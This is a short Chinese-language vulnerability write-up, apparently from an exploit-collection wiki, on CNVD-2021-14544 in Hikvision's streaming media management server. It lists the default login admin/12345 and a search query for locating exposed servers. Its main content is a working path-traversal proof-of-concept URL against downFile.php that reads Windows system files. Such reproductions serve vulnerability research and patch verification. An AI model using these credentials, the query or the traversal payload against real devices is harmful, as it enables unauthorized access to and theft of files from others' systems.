# HIKVISION 流媒体管理服务器 后台任意文件读取漏洞 CNVD-2021-14544

## 漏洞描述

杭州海康威视系统技术有限公司流媒体管理服务器存在弱口令漏洞，攻击者可利用该漏洞登录后台通过文件遍历漏洞获取敏感信息

## 漏洞影响

<a-checkbox checked>HIKVISION 流媒体管理服务器</a-checkbox></br>

## 网络测绘

<a-checkbox checked>title="流媒体管理服务器"</a-checkbox></br>

## 漏洞复现

登录页面如下， 默认账号密码为 `admin/12345`



![img](../../../.vuepress/public/img/hiv-5.png)



POC如下，访问如下Url下载 system.ini文件



```plain
http://xxx.xxx.xxx.xxx/systemLog/downFile.php?fileName=../../../../../../../../../../../../../../../windows/system.ini
```



![img](../../../.vuepress/public/img/hiv-6.png)



成功读取 `C:/windows/system.ini`